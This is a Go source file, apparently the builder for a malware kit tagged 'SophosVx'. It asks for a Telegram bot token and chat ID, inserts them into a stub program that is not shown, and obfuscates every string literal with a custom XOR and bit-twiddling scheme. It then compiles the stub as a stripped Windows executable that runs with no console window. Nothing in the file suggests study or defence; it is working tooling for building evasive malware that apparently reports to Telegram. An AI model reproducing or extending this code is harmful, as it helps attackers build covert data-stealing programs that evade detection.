//SophosVx

package main

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func gen_key(length int) ([]byte, error) {
	key := make([]byte, length)
	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}
	return key, nil
}

func bytes_to_str(b []byte) string {
	s := ""
	for i, v := range b {
		if i > 0 {
			s += ", "
		}
		s += fmt.Sprintf("0x%02x", v)
	}
	return s
}

func obfuscate_string(input string, key []byte) string {
	input_base64 := base64.StdEncoding.EncodeToString([]byte(input))
	input_bytes := []byte(input_base64)
	key_len := len(key)
	output := make([]byte, len(input_bytes))

	for i, b := range input_bytes {
		output[i] = b ^ key[i%key_len]
		output[i] = (output[i] << 4) | (output[i] >> 4)
		output[i] = ^output[i]
		output[i] = (output[i] + 3) ^ 0xAA
	}

	return base64.StdEncoding.EncodeToString(output)
}

func copy_stub(src_dir, dest_dir string) error {
	stub_files, err := os.ReadDir(src_dir)
	if err != nil {
		return err
	}

	err = os.MkdirAll(dest_dir, os.ModePerm)
	if err != nil {
		return err
	}

	for _, file := range stub_files {
		if !file.IsDir() {
			src_path := filepath.Join(src_dir, file.Name())
			dest_path := filepath.Join(dest_dir, file.Name())

			src_file, err := os.Open(src_path)
			if err != nil {
				return err
			}
			defer src_file.Close()

			dest_file, err := os.Create(dest_path)
			if err != nil {
				return err
			}
			defer dest_file.Close()

			_, err = io.Copy(dest_file, src_file)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func obfuscate_stub(stub_path, bot_token, chat_id string, key []byte) error {
	input, err := os.ReadFile(stub_path)
	if (err != nil) {
		return fmt.Errorf("error reading stub file: %w", err)
	}

	input_str := string(input)
	input_str = strings.ReplaceAll(input_str, "\"TELEGRAM_BOT_TOKEN\"", fmt.Sprintf("string(deobf_str(\"%s\", xor_key))", bot_token))
	input_str = strings.ReplaceAll(input_str, "\"TELEGRAM_CHAT_ID\"", fmt.Sprintf("string(deobf_str(\"%s\", xor_key))", chat_id))

	key_str := bytes_to_str(key)
	input_str = strings.ReplaceAll(input_str, "0xDE, 0xAD, 0xBE, 0xEF", key_str)

	var sb strings.Builder
	in_string := false
	var current_string strings.Builder
	in_import := false

	lines := strings.Split(input_str, "\n")
	replaced_lines := make(map[int]bool)

	for i, line := range lines {
		trimmed_line := strings.TrimSpace(line)
		if strings.Contains(trimmed_line, bot_token) || strings.Contains(trimmed_line, chat_id) {
			replaced_lines[i] = true
		}
	}

	for i, line := range lines {
		if replaced_lines[i] {
			sb.WriteString(line + "\n")
			continue
		}

		trimmed_line := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed_line, "import (") {
			in_import = true
		}
		if in_import {
			sb.WriteString(line + "\n")
			if strings.HasSuffix(trimmed_line, ")") {
				in_import = false
			}
			continue
		}

		for _, r := range line {
			if r == '"' {
				if in_string {
					original_string := current_string.String()
					if strings.Contains(original_string, "\\n") {
						original_string = strings.ReplaceAll(original_string, "\\n", "")
						obfuscated_string := obfuscate_string(original_string, key)
						sb.WriteString(fmt.Sprintf("string(deobf_str(\"%s\", xor_key)) + \"\\n\"", obfuscated_string))
					} else {
						obfuscated_string := obfuscate_string(original_string, key)
						sb.WriteString(fmt.Sprintf("string(deobf_str(\"%s\", xor_key))", obfuscated_string))
					}
					current_string.Reset()
				}
				in_string = !in_string
			} else if in_string {
				current_string.WriteRune(r)
			} else {
				sb.WriteRune(r)
			}
		}
		sb.WriteString("\n")
	}

	err = os.WriteFile(stub_path, []byte(sb.String()), 0644)
	if err != nil {
		return fmt.Errorf("error writing stub file: %w", err)
	}
	return nil
}

func build_stub(stub_path, output_path string) error {
	cmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", output_path+"\\stub.exe", stub_path)
	err := cmd.Run()
	if err != nil {
		return err
	}

	return os.RemoveAll(filepath.Join(output_path, "Temp"))
}

func main() {
	var bot_token, chat_id string

	fmt.Print("Enter bot token: ")
	fmt.Scanln(&bot_token)

	fmt.Print("Enter chat ID: ")
	fmt.Scanln(&chat_id)

	key, err := gen_key(32)
	if err != nil {
		fmt.Println("Error generating key:", err)
		return
	}

	obf_bot_token := obfuscate_string(bot_token, key)
	obf_chat_id := obfuscate_string(chat_id, key)

	err = copy_stub("Source\\Stub", "Output\\Temp")
	if err != nil {
		fmt.Println("Error copying stub:", err)
		return
	}

	err = obfuscate_stub("Output\\Temp\\stub.go", obf_bot_token, obf_chat_id, key)
	if err != nil {
		fmt.Println("Error obfuscating stub:", err)
		return
	}

	err = build_stub("Output\\Temp\\stub.go", "Output")
	if err != nil {
		fmt.Println("Error building stub:", err)
		return
	}
}
